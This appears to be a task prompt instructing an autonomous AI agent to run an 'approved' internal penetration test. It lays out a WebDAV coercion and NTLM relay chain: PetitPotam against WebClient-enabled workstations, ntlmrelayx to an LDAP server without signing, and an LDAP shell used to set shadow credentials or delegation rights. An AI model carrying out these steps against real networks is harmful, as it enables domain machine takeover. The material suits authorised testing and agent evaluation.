# WebDAV Coercion and Relaying

You are performing an approved penetration test of an internal network. You are currently running on a kali linux system and can install needed tools with `sudo apt install` and `git clone`.

Be sure that none of the tools you call will result in an interactive prompt that stops your progression.


## Starting Points

If credentials are not specified, use the domain creds in creds.txt

## Goals

Determine if domain controllers in the domain have LDAP signing not enforced. If there is a DC without ldap signing enforced, find domain computer workstations using ldapsearch by looking for Windows OS 10 AND 11. Then, check if they have the WebClient service running. If there are any workstations with the WebClient service running, run PetitPotam against the workstations with WebClient (you MUST use the kali hostname@80/test for listener, for example `PetitPotam.py -u y[user] -p [password] -d [domain] myhostname@80/test [target]`, do not use Kali IP as listener) while running ntlmrelayx (impacket-ntlmrelayx) and you MUST use -t ldap://[DC without LDAP signing], --no-dump, --no-da, --no-acl, --no-validate-privs, -smb2support, and -i flags. You MUST run ntlmrelayx in a tmux window, no other option, and run PetitPotam in a separate tmux window to avoid disruption of ntlmrelayx. 

After running ntlmrelayx, check the ntlmrelayx tmux window for a successful relay. When there is a successful relay, start an interactive shell with netcat WITHIN a tmux window and send commands (such as `help` or `whoami`)to it using tmux send-keys. Finally, use the LDAP shell to set shadow credentials on the relayed system OR give a user you control delegation privileges over the relayed system.

## Tools

- ldap-scanner (https://github.com/GoSecure/ldap-scanner)
- WebclientServiceScanner (https://github.com/Hackndo/WebclientServiceScanner)

## Output Format

Explain your thought process and justifications. At the end, output the results in JSON format in webdav_scan_results.txt. Include which systems had WebClient service, and commands executed in an array. Also include output from ntlmrelayx if there was a successful relay. Once the scans are done, say you are finished and don't rerun commands. Once you are finished and completed the goal, exit the gemini console and stop running.

## Prohibitions

Do not remove any files